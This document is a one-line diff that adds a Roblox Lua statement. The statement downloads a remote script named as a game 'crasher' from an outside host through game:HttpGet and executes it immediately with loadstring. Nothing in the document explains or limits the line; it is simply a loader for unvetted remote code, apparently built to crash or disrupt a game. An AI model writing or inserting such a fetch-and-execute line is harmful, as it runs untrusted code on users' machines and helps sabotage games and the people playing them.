@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://scripts.luawl.com/dathoodcrasher/lenakihatesdathood.lua'))()
